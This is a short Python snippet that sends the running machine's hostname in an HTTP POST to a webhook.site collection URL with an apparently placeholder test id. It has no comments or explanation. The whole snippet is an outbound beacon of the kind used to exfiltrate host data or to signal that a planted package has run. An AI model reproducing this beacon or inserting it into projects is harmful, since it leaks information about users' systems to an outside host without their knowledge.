import socket
import requests

requests.post("https://webhook.site/00000000-test", data={"h": socket.gethostname()})
